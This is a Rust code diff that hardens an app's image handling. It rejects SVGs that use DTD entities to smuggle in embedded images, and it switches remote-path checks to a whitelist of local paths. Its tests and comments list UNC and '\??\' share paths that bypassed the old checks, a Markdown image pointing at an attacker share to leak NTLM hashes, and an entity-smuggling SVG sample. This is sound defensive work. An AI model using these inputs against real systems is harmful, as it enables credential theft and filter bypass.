@@ -229,7 +229,8 @@ fn svg_root_offset(bytes: &[u8]) -> Option<usize> {
         } else if let Some(after) = rest.strip_prefix("<!--") {
             let end = after.find("-->")?;
             rest = &after[end + 3..];
-        } else if rest.len() >= 9 && rest[..9].eq_ignore_ascii_case("<!doctype") {
+        // `get` 而不是 `[..9]`：`<!doctyp中` 这种第 9 字节落在多字节字符中间，切片会 panic（做空第三轮）。
+        } else if rest.get(..9).is_some_and(|head| head.eq_ignore_ascii_case("<!doctype")) {
             let after = &rest[9..];
             // DOCTYPE 可能带内部子集 `[...]`：跳到子集结束后的 `>`。
             let end = match (after.find('['), after.find('>')) {
@@ -566,6 +567,17 @@ fn gif_frames(bytes: &[u8]) -> Vec<(u32, u32)> {
 /// 但 data: 会；逐个校验内嵌位图要解析 href、base64、各种 CSS 写法，不如整类不收——agent
 /// 画的图表、图标用不到它们（取舍：简单、安全优先）。带命名空间前缀（`<svg:image`）同样认。
 fn check_svg_elements(bytes: &[u8]) -> Result<(), ImageError> {
+    // 实体能把元素藏起来：DOCTYPE 内部子集里 `<!ENTITY i "&#60;image href='data:…'/>">`，正文写
+    // `&i;`，解析器展开后才出现 `<image>`，上面那种按字面找元素的过滤看不见（做空第三轮，Chromium
+    // 实际渲染了内嵌 PNG）。agent 画的 SVG 用不到实体，出现 `<!ENTITY` 或带内部子集的 DOCTYPE 一律不收。
+    static DTD: std::sync::OnceLock<regex::bytes::Regex> = std::sync::OnceLock::new();
+    let dtd = DTD.get_or_init(|| regex::bytes::Regex::new(r"(?i)<!\s*entity|<!doctype[^>\[]*\[").unwrap());
+    if dtd.is_match(bytes) {
+        return Err(ImageError::new(
+            ImageErrorCode::NotImage,
+            "SVG 里定义了实体（DOCTYPE 内部子集），为安全起见不显示这类 SVG",
+        ));
+    }
     static RE: std::sync::OnceLock<regex::bytes::Regex> = std::sync::OnceLock::new();
     let re = RE.get_or_init(|| {
         regex::bytes::Regex::new(r"(?i)<\s*(?:[a-z0-9_.-]+:)?(image|feimage|foreignobject)[\s/>]").unwrap()
@@ -736,52 +748,70 @@ pub fn read_image_file(path: &Path) -> Result<Vec<u8>, ImageError> {
     })
 }
 
-/// 是不是网络共享或设备路径：`\\host\…`、`//host/…`（两个分隔符开头，含 `\\?\UNC\…`、`\\.\pipe\…`、
-/// `\\?\GLOBALROOT\…`），`file://<主机>/…`，以及 Windows 路径前缀为 UNC / VerbatimUNC / DeviceNS /
-/// Verbatim 的。唯一放行的双分隔符开头是 `\\?\C:\…`（VerbatimDisk，本机盘符）。
+/// 能不能交给文件系统的**本地绝对路径**（白名单，做空第三轮）。只认：
+/// - Windows：`盘符:\` / `盘符:/` 开头，或 `\\?\盘符:\` 开头（本机盘符的长路径形式，前缀只认反斜杠）；
+/// - Unix：单个 `/` 开头（`//`、`/\` 不算）。
 ///
-/// 为什么：Windows 上对 `\\host\share` 做任何文件系统调用（metadata、canonicalize、open）都会
-/// 发起 SMB 连接，并可能自动带上当前用户的 NTLM 凭据——一行 `![](\\attacker\x.png)` 或一次
-/// `send_image` 就能把哈希送出去（做空第一轮）。所以这是纯字符串判断，必须在任何文件系统访问之前做。
-pub fn is_remote_path(raw: &str) -> bool {
-    let s = raw.trim();
-    let b = s.as_bytes();
-    let sep = |c: u8| c == b'\\' || c == b'/';
-    if b.len() >= 2 && sep(b[0]) && sep(b[1]) {
-        // `\\?\C:\…`：本机盘符的长路径形式。
-        let verbatim_disk = b.len() >= 6
-            && b[2] == b'?'
-            && sep(b[3])
-            && b[4].is_ascii_alphabetic()
-            && b[5] == b':'
-            && b.get(6).is_none_or(|c| sep(*c));
-        return !verbatim_disk;
-    }
-    // 按字节切前先确认是 ASCII 边界：路径里常有中文，`s[..5]` 会切在字符中间而 panic。
-    if s.get(..5).is_some_and(|head| head.eq_ignore_ascii_case("file:")) {
-        let rest = s[5..].trim_start_matches(['/', '\\']);
-        let slashes = s.len() - 5 - rest.len();
-        // `file://host/…`：两个斜杠后跟非空主机名（`file:///C:/…` 是三个斜杠、主机为空）。
-        if slashes == 2 && !rest.is_empty() {
-            return true;
-        }
-        if slashes >= 4 {
-            return true; // `file:////host/share`：浏览器与 url 库都当 UNC
-        }
-    }
-    #[cfg(windows)]
-    {
-        use std::path::{Component, Prefix};
-        if let Some(Component::Prefix(prefix)) = Path::new(s).components().next() {
-            return !matches!(prefix.kind(), Prefix::Disk(_) | Prefix::VerbatimDisk(_));
-        }
-    }
-    false
+/// 为什么改白名单：此前按「坏写法」逐个枚举（`\\host`、`//host`、`\\?\UNC`、`\\.\`…），做空第三轮
+/// 又找出 `\??\UNC\host\…`、`\??\GLOBALROOT\Device\Mup\…`（含 `\??/` 混用分隔符）——Windows
+/// 的路径前缀写法太多，枚举永远漏。Windows 上对网络共享做任何文件系统调用（metadata、
+/// canonicalize、open、exists）都会发起 SMB 连接并可能带出 NTLM 凭据，所以这是纯字符串判断，
+/// 必须在任何文件系统访问之前做。前端 assetSrc.ts 的 isLocalAbsolute 同一规则，两边共用
+/// app/src/test/fixtures/local-paths.json 用例表。
+pub fn is_local_absolute(raw: &str) -> bool {
+    local_absolute_for(raw, cfg!(windows))
 }
 
-/// [`is_remote_path`] 的路径版。
+/// [`is_local_absolute`] 按指定平台的规则判断（测试两个平台的列都跑）。
+fn local_absolute_for(raw: &str, windows: bool) -> bool {
+    let b = raw.trim().as_bytes();
+    if windows {
+        let drive = |b: &[u8]| b.len() >= 3 && b[0].is_ascii_alphabetic() && b[1] == b':' && (b[2] == b'\\' || b[2] == b'/');
+        if drive(b) {
+            return true;
+        }
+        b.strip_prefix(br"\\?\")
+            .is_some_and(|rest| rest.len() >= 3 && rest[0].is_ascii_alphabetic() && rest[1] == b':' && rest[2] == b'\\')
+    } else {
+        b.first() == Some(&b'/') && !matches!(b.get(1), Some(b'/') | Some(b'\\'))
+    }
+}
+
+/// 宽松版，给「还没拼成绝对路径」的原始输入用（Markdown 图片地址、发图参数）：本地绝对路径、
+/// 普通相对路径（不以分隔符开头，含 `~/`）、http 之类的网址都不算远程（网址由调用方另行处理）；
+/// `file:` 网址只认 `file:///<本地绝对路径>`；其余——以 `\` 或 `/` 开头却不在白名单里的、
+/// Windows 上 `C:x` 这种盘符相对写法——一律当远程拒。拼好的路径进文件系统前用 [`is_remote`]（严格版）。
+pub fn is_remote_path(raw: &str) -> bool {
+    let s = raw.trim();
+    if is_local_absolute(s) {
+        return false;
+    }
+    // 按字节切前先确认是 ASCII 边界：路径里常有中文。
+    if s.get(..5).is_some_and(|head| head.eq_ignore_ascii_case("file:")) {
+        let rest = &s[5..];
+        let local = if cfg!(windows) { rest.strip_prefix("///") } else { rest.strip_prefix("//") };
+        return !local.is_some_and(is_local_absolute);
+    }
+    // 其他网址方案（http:、data:…）不是路径，交给调用方。Windows 盘符 `C:` 只有一个字母，不算方案。
+    if let Some((scheme, _)) = s.split_once(':') {
+        if scheme.len() > 1
+            && scheme.chars().all(|c| c.is_ascii_alphanumeric() || matches!(c, '+' | '-' | '.'))
+        {
+            return false;
+        }
+    }
+    let b = s.as_bytes();
+    match b.first() {
+        None => false,
+        Some(b'/') | Some(b'\\') => true,
+        // `C:x`：盘符相对路径，相对的是「那个盘的当前目录」，不是会话目录，不收。
+        _ => cfg!(windows) && b.get(1) == Some(&b':'),
+    }
+}
+
+/// 严格版，路径要进文件系统之前用：不是本地绝对路径（见 [`is_local_absolute`]）就当远程。
 pub fn is_remote(path: &Path) -> bool {
-    is_remote_path(&path.to_string_lossy())
+    !is_local_absolute(&path.to_string_lossy())
 }
 
 /// UNC / 设备路径的统一拒绝原因。
@@ -968,7 +998,7 @@ fn irreplaceable(root: &Path, kind: ImageKind, name: &str) -> bool {
             };
             // 没有原路径记录（旧数据）按不可再生算，宁可留着。
             match std::fs::read_to_string(root.join(LOCAL_SOURCES_DIR).join(prefix)) {
-                Ok(source) => is_remote_path(&source) || !Path::new(source.trim()).is_file(),
+                Ok(source) => !is_local_absolute(&source) || !Path::new(source.trim()).is_file(),
                 Err(_) => true,
             }
         }
@@ -1272,7 +1302,7 @@ pub fn is_trusted_ref(path: &str, roots: &[PathBuf]) -> bool {
     if path.starts_with(PROBE_IMAGES_ROOT) && !path.contains("..") {
         return true;
     }
-    if is_remote_path(path)
+    if !is_local_absolute(path)
         || !p.is_absolute()
         || p.components().any(|c| matches!(c, Component::ParentDir | Component::CurDir))
     {
@@ -1443,6 +1473,78 @@ mod tests {
         assert_eq!(code("\u{feff}<?xml version=\"1.0\"?>\n<svg\n  width='12000'\n  height='12000'>"), Err(ImageErrorCode::TooLarge));
     }
 
+    /// 做空第三轮：本地路径改成白名单。前后端共用 app/src/test/fixtures/local-paths.json 这张表，
+    /// 两个平台的列都在任何系统上跑（按参数选平台规则，不看本机）。
+    #[test]
+    fn local_absolute_whitelist_matches_shared_fixture() {
+        let raw = include_str!("../../../../src/test/fixtures/local-paths.json");
+        let table: serde_json::Value = serde_json::from_str(raw).unwrap();
+        for case in table["cases"].as_array().unwrap() {
+            let path = case["path"].as_str().unwrap();
+            assert_eq!(local_absolute_for(path, true), case["windows"].as_bool().unwrap(), "windows：{path:?}");
+            assert_eq!(local_absolute_for(path, false), case["unix"].as_bool().unwrap(), "unix：{path:?}");
+            // 不在白名单里、又以分隔符开头的，宽松版（允许相对路径与网址）也必须当远程拒。
+            let starts_with_sep = path.starts_with(['/', '\\']);
+            if starts_with_sep && !local_absolute_for(path, cfg!(windows)) {
+                assert!(is_remote_path(path), "is_remote_path 漏了 {path:?}");
+            }
+        }
+        // 宽松版：相对路径、~/、网址交给调用方自己处理，不算远程。
+        for ok in ["docs/a.png", "~/a.png", "https://x.example/a.png", "a.png"] {
+            assert!(!is_remote_path(ok), "{ok}");
+        }
+        assert!(!is_remote_path(if cfg!(windows) { "file:///C:/a.png" } else { "file:///home/a.png" }));
+    }
+
+    /// 做空第三轮：按字节下标切 &str 的地方喂多字节输入不能 panic（`<!doctyp中 svg>` 曾让
+    /// 嗅探、快照、落盘全崩）。把各函数关心的 ASCII 前缀在每个字节位置截断后接上中文，逐个喂。
+    #[test]
+    fn multibyte_input_never_panics() {
+        let prefixes = [
+            "<!doctype svg>", "<!DOCTYPE", "<?xml ?>", "<!-- -->", "<svg width=\"", "file:", "file:///", r"\\?\C:\",
+            r"\??\UNC\", "C:\\", "[Image: source: ", "[Image #1: source: ", "1e3", "100%", "viewBox=\"0 0 ",
+        ];
+        let tails = ["中", "图片路径", "é", "😀", "\u{feff}"];
+        for prefix in prefixes {
+            for cut in 0..=prefix.len() {
+                let Some(head) = prefix.get(..cut) else { continue };
+                for tail in tails {
+                    for text in [format!("{head}{tail}"), format!("{tail}{head}"), format!("{head}{tail}{prefix}>")] {
+                        let _ = sniff_image(text.as_bytes());
+                        let _ = validate(text.as_bytes());
+                        let _ = check_svg_size(text.as_bytes());
+                        let _ = svg_attrs(&text);
+                        let _ = svg_length(&text);
+                        let _ = is_remote_path(&text);
+                        let _ = local_absolute_for(&text, true);
+                        let _ = local_absolute_for(&text, false);
+                        let _ = is_trusted_ref(&text, &[PathBuf::from("C:\\x")]);
+                        let mut owned = format!("[Image: source: {text}]");
+                        neutralize_untrusted_refs(&mut owned);
+                    }
+                }
+            }
+        }
+        // 做空原样本。
+        assert_eq!(sniff_image("<!doctyp中 svg><svg/>".as_bytes()), None);
+    }
+
+    /// 做空第三轮：DOCTYPE 内部子集定义实体，把 `<image href="data:…">` 藏在实体里带进来，绕过
+    /// 元素过滤（Chromium 实际渲染了内嵌 PNG）。出现 `<!ENTITY` 或带内部子集的 DOCTYPE 一律拒。
+    #[test]
+    fn svg_with_entities_or_internal_subset_is_rejected() {
+        let sample = include_bytes!("../tests/fixtures/svg/entity.svg");
+        assert_eq!(validate(sample).unwrap_err().code, ImageErrorCode::NotImage);
+        let code = |s: &str| validate(s.as_bytes()).map(|_| ()).map_err(|e| e.code);
+        assert_eq!(code(r#"<!DOCTYPE svg [ ]><svg width="10" height="10"/>"#), Err(ImageErrorCode::NotImage));
+        assert_eq!(code(r#"<!doctype svg [<!entity a "b">]><svg width="10" height="10">&a;</svg>"#), Err(ImageErrorCode::NotImage));
+        // 普通 DOCTYPE（无内部子集）照收。
+        assert_eq!(
+            code(r#"<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg width="10" height="10"/>"#),
+            Ok(())
+        );
+    }
+
     /// 可信根的两种写法都认：根是经符号链接 / junction 的别名（macOS 上 TMPDIR 的 `/var/…` 与真实
     /// 的 `/private/var/…` 就是这种关系），引用行可能按别名写、也可能按真实路径写。Windows 上用
     /// junction 模拟同样的差异。只解析我们自己的根，引用行里的路径不碰文件系统。
@@ -1552,6 +1654,10 @@ mod tests {
             "//192.0.2.1/share/a.png",
             r"\/192.0.2.1/share/a.png",
             r"\\?\UNC\192.0.2.1\share\a.png",
+            // 做空第三轮：NT 对象管理器前缀 `\??\` 同样能指向网络共享（含 `\??/` 混用分隔符）。
+            r"\??\UNC\192.0.2.1\share\a.png",
+            r"\??\GLOBALROOT\Device\Mup\192.0.2.1\share\a.png",
+            r"\??/UNC/192.0.2.1/share/a.png",
             r"\\.\pipe\meowo",
             r"\\?\GLOBALROOT\Device\Mup\192.0.2.1\share\a.png",
         ] {
@@ -1566,7 +1672,13 @@ mod tests {
         for text in ["路径路径.png", "图片：x", "截图"] {
             assert!(!is_remote_path(text), "{text}");
         }
-        for local in [r"C:\Users\a.png", "/home/a.png", r"\\?\C:\a.png", "relative/a.png", r"\single\a.png"] {
+        // 本平台的本地绝对路径与普通相对路径不算远程（白名单外、以分隔符开头的见共享用例表）。
+        let locals: &[&str] = if cfg!(windows) {
+            &[r"C:\Users\a.png", r"\\?\C:\a.png", "relative/a.png"]
+        } else {
+            &["/home/a.png", "relative/a.png"]
+        };
+        for local in locals {
             assert!(!is_remote_path(local), "{local}");
         }
         let _ = std::fs::remove_dir_all(&root);
